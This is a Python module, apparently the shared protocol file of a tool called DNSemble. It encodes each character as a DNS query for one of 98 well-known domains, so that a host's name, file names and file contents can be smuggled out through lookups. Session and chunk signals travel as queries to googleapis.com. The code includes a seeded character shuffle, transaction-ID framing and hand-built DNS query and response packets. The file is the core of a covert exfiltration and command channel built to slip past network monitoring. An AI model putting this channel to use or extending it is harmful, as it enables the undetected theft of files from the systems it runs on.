#!/usr/bin/env python3
"""
DNSemble - Shared domain mapping and protocol constants.

Maps 95 printable ASCII characters (0x20-0x7E) plus \\n, \\t, \\r
to 98 well-known domains.  The domain queried IS the data channel.

STATIC MAPPING — the domain list is hardcoded in every agent at
build time.  On SESSION_START the server picks a random 32-bit seed,
returns it as the A-record IP, and both sides feed that seed into
the same deterministic PRNG (xorshift32 Fisher-Yates) to build
identical permutation tables.

Protocol layout
───────────────
  Transaction ID (16 bits):
    High byte [15:8] = client_id  (0-255)
    Low  byte  [7:0] = seq_num    (0-255, wraps with CHUNK control)

  Control channel:
    A query to CONTROL_DOMAIN ("googleapis.com")
    seq byte = control code (0-3) or chunk offset (≥4)

  Data channel (QTYPE selects the phase):
    A    (1)  = file content character
    AAAA (28) = hostname character
    MX   (15) = filename character
"""

import struct
from pathlib import Path

# ---------------------------------------------------------------------------
# Control domain — all control signals go here as plain A queries.
# ---------------------------------------------------------------------------
CONTROL_DOMAIN = "googleapis.com"

# ---------------------------------------------------------------------------
# Character set: printable ASCII (32-126) + \n \t \r  → 98 entries
# ---------------------------------------------------------------------------
_PRINTABLE = [chr(i) for i in range(32, 127)]
_SPECIAL   = ["\n", "\t", "\r"]
ALL_CHARS  = _PRINTABLE + _SPECIAL

CHAR_TO_INDEX = {ch: i for i, ch in enumerate(ALL_CHARS)}

# ---------------------------------------------------------------------------
# Domain loading
# ---------------------------------------------------------------------------
_DEFAULT_DOMAINS_PATH = Path(__file__).resolve().parent.parent / "data" / "domains.txt"

def load_domains(path=None):
    p = Path(path) if path else _DEFAULT_DOMAINS_PATH
    domains = [line.strip() for line in p.read_text().splitlines() if line.strip()]
    if len(domains) != len(ALL_CHARS):
        raise ValueError(
            f"Domain list must have exactly {len(ALL_CHARS)} entries, "
            f"got {len(domains)} from {p}")
    return domains

DOMAINS = load_domains()
DOMAIN_TO_INDEX = {d: i for i, d in enumerate(DOMAINS)}

def init_domains(path=None):
    global DOMAINS, DOMAIN_TO_INDEX
    DOMAINS = load_domains(path)
    DOMAIN_TO_INDEX = {d: i for i, d in enumerate(DOMAINS)}

# ---------------------------------------------------------------------------
# QTYPE constants  (data-phase selector)
# ---------------------------------------------------------------------------
QTYPE_A    = 1    # content
QTYPE_MX   = 15   # filename
QTYPE_TXT  = 16
QTYPE_AAAA = 28   # hostname

QTYPE_LABELS = {QTYPE_A: "A", QTYPE_AAAA: "AAAA", QTYPE_MX: "MX", QTYPE_TXT: "TXT"}

# ---------------------------------------------------------------------------
# Control codes  (seq byte when domain == CONTROL_DOMAIN, qtype == A)
# ---------------------------------------------------------------------------
CTRL_SESSION_START = 0
CTRL_END_HOSTNAME  = 1
CTRL_END_FILENAME  = 2
CTRL_END_CONTENT   = 3
CTRL_CHUNK_OFFSET  = 3   # seq >= 4 → NEXT_CHUNK, chunk = seq - CTRL_CHUNK_OFFSET

CTRL_LABELS = {
    0: "SESSION_START",
    1: "END_HOSTNAME",
    2: "END_FILENAME",
    3: "END_CONTENT",
}

# ---------------------------------------------------------------------------
# Portable PRNG — xorshift32, identical in Python and C
# ---------------------------------------------------------------------------
def _xorshift32(state):
    state ^= (state << 13) & 0xFFFFFFFF
    state ^= (state >> 17)
    state ^= (state << 5) & 0xFFFFFFFF
    return state & 0xFFFFFFFF

def generate_permutation(seed):
    """Deterministic Fisher-Yates shuffle using xorshift32."""
    perm = list(range(len(ALL_CHARS)))
    state = seed & 0xFFFFFFFF
    if state == 0:
        state = 1
    for i in range(len(perm) - 1, 0, -1):
        state = _xorshift32(state)
        j = state % (i + 1)
        perm[i], perm[j] = perm[j], perm[i]
    return perm

def build_char_to_domain(perm, domains=None):
    """char → domain lookup from a permutation."""
    domains = domains or DOMAINS
    return {ALL_CHARS[ci]: domains[perm[ci]] for ci in range(len(perm))}

def build_domain_to_char(perm, domains=None):
    """domain → char lookup (inverse) from a permutation."""
    domains = domains or DOMAINS
    return {domains[perm[ci]]: ALL_CHARS[ci] for ci in range(len(perm))}

def seed_to_ip(seed):
    b = seed.to_bytes(4, "big")
    return f"{b[0]}.{b[1]}.{b[2]}.{b[3]}"

def ip_to_seed(ip_bytes):
    return int.from_bytes(ip_bytes, "big")

# ---------------------------------------------------------------------------
# Transaction ID helpers
# ---------------------------------------------------------------------------
def encode_txid(client_id, seq_num):
    return ((client_id & 0xFF) << 8) | (seq_num & 0xFF)

def decode_txid(txid):
    return (txid >> 8) & 0xFF, txid & 0xFF

# ---------------------------------------------------------------------------
# DNS wire-format helpers  (pure Python, zero dependencies)
# ---------------------------------------------------------------------------
def encode_domain_name(domain):
    out = b""
    for label in domain.split("."):
        out += struct.pack("B", len(label)) + label.encode("ascii")
    return out + b"\x00"

def decode_domain_name(data, offset):
    labels = []
    while offset < len(data):
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if (length & 0xC0) == 0xC0:
            ptr = struct.unpack("!H", data[offset:offset + 2])[0] & 0x3FFF
            sub, _ = decode_domain_name(data, ptr)
            labels.append(sub)
            offset += 2
            return ".".join(labels), offset
        offset += 1
        labels.append(data[offset:offset + length].decode("ascii"))
        offset += length
    return ".".join(labels), offset

def build_dns_query(txid, domain, qtype):
    header = struct.pack("!6H", txid, 0x0100, 1, 0, 0, 0)
    question = encode_domain_name(domain) + struct.pack("!2H", qtype, 1)
    return header + question

def parse_dns_query(data):
    if len(data) < 12:
        return None
    txid, flags, qdcount = struct.unpack("!3H", data[:6])
    if qdcount < 1:
        return None
    qname, offset = decode_domain_name(data, 12)
    if offset + 4 > len(data):
        return None
    qtype, _ = struct.unpack("!2H", data[offset:offset + 4])
    return txid, qname, qtype

def build_dns_response(query_data, ip="0.0.0.0"):
    if len(query_data) < 12:
        return query_data
    txid = query_data[0:2]
    flags = struct.pack("!H", 0x8180)
    counts = struct.pack("!4H", 1, 1, 0, 0)
    header = txid + flags + counts
    raw_q = query_data[12:]
    end = raw_q.index(b"\x00") + 1
    qsection = raw_q[:end + 4]
    octets = [int(o) for o in ip.split(".")]
    answer = (
        struct.pack("!H", 0xC00C)
        + struct.pack("!HHI", 1, 1, 300)
        + struct.pack("!H", 4)
        + bytes(octets)
    )
    return header + qsection + answer

def parse_a_record(data):
    if len(data) < 12:
        return None
    ancount = struct.unpack("!H", data[6:8])[0]
    if ancount < 1:
        return None
    offset = 12
    while offset < len(data) and data[offset] != 0:
        offset += 1 + data[offset]
    offset += 1 + 4
    if offset + 2 > len(data):
        return None
    if (data[offset] & 0xC0) == 0xC0:
        offset += 2
    else:
        while offset < len(data) and data[offset] != 0:
            offset += 1 + data[offset]
        offset += 1
    if offset + 10 > len(data):
        return None
    rtype = struct.unpack("!H", data[offset:offset + 2])[0]
    offset += 8
    rdlen = struct.unpack("!H", data[offset:offset + 2])[0]
    offset += 2
    if rtype == 1 and rdlen == 4 and offset + 4 <= len(data):
        return data[offset:offset + 4]
    return None

def build_dns_txt_response(query_data, text):
    if len(query_data) < 12:
        return query_data
    txid = query_data[0:2]
    flags = struct.pack("!H", 0x8180)
    counts = struct.pack("!4H", 1, 1, 0, 0)
    header = txid + flags + counts
    raw_q = query_data[12:]
    end = raw_q.index(b"\x00") + 1
    qsection = raw_q[:end + 4]
    text_bytes = text.encode("ascii")
    rdata = b""
    off = 0
    while off < len(text_bytes):
        chunk = text_bytes[off:off + 255]
        rdata += struct.pack("B", len(chunk)) + chunk
        off += 255
    answer = (
        struct.pack("!H", 0xC00C)
        + struct.pack("!HHI", QTYPE_TXT, 1, 300)
        + struct.pack("!H", len(rdata))
        + rdata
    )
    return header + qsection + answer

def build_servfail(query_data):
    if len(query_data) < 12:
        return query_data
    return query_data[0:2] + struct.pack("!H", 0x8182) + query_data[4:]
